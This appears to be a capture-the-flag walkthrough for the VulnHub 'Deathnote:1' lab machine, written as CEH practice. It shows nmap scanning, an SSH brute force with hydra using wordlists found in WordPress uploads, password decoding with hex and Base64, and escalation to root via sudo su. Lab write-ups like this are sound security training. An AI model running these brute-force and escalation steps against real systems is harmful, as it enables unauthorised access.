# 📝 CEH Practical Walkthrough – VulnHub *Deathnote:1*

## 🔎 1. Reconnaissance
First, scan the network to identify the target host and open ports:

```bash
nmap -sV -p- 192.168.56.123
```

**Results**:
- **22/tcp** – OpenSSH  
- **80/tcp** – Apache/WordPress  

---

## 🌐 2. Web Enumeration
Browsing to `http://192.168.56.123/wordpress/`, WordPress is discovered.  

Under `wp-content/uploads/`, two interesting files were found:
- `user.txt`
- `notes.txt`

---

## 🔐 3. Brute-forcing SSH
Using `hydra` with the two wordlists:

```bash
hydra -L user.txt -P notes.txt ssh://192.168.56.123
```

**Credentials found**:
```
l : death4me
```

---

## 💻 4. User Shell (l)
Login via SSH:

```bash
ssh l@192.168.56.123
```

After exploring, we find `/opt/L` containing a suspicious file:  

```bash
ls /opt/L
case.wav  hint
```

---

## 🎧 5. Decoding Hidden Password
`case.wav` contained hex-encoded data. Following the hint, decoding with CyberChef (Hex → ASCII → Base64) revealed:

```
kiraisevil
```

---

## 🔑 6. Escalating to User kira
Switch user with the recovered password:

```bash
ssh kira@192.168.56.123
# or
su kira
```

Login successful. Inside home directory:

```bash
ls
kira.txt
```

Content of `kira.txt`:

```
cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp
```

This is **Base64** (serves as a flag and hint).  
Decoded message:

```
please protect one of the following 
1. L (/opt)
2. Misa (/var)
```

---

## 🛠️ 7. Privilege Escalation
Check sudo privileges:

```bash
sudo -l
```

`kira` can run sudo. Escalate:

```bash
sudo su
```

Now root:

```bash
whoami
root
```

---

## 🏁 8. Root Flag
Navigate to root directory:

```bash
cd /root
ls
root.txt
cat root.txt
```

**Flag**:  
```
::::::::       ::::::::       ::::    :::       ::::::::       :::::::::           :::    :::::::::::       :::::::: 
:+:    :+:     :+:    :+:      :+:+:   :+:      :+:    :+:      :+:    :+:        :+: :+:      :+:          :+:    :+: 
+:+            +:+    +:+      :+:+:+  +:+      +:+             +:+    +:+       +:+   +:+     +:+          +:+         
#+#            +#+    +:+      +#+ +:+ +#+      :#:             +#++:++#:       +#++:++#++:    +#+          +#++:++#++   
#+#            +#+    +#+      +#+  +#+#+#      +#+   +#+#      +#+    +#+      +#+     +#+    +#+                 +#+    
#+#    #+#     #+#    #+#      #+#   #+#+#      #+#    #+#      #+#    #+#      #+#     #+#    #+#          #+#    #+#     
########       ########       ###    ####       ########       ###    ###      ###     ###    ###           ########       

##########follow me on twitter###########3
and share this screen shot and tag @KDSAMF
```

---

## 🎯 Summary of Findings
- **User Flag 1 (l)** → `user.txt` from uploads.  
- **User Flag 2 (kira)** → Base64 string in `kira.txt`.  
- **Final Flag (root)** → `/root/root.txt`.  

✅ Successfully gained root access and captured all flags.  
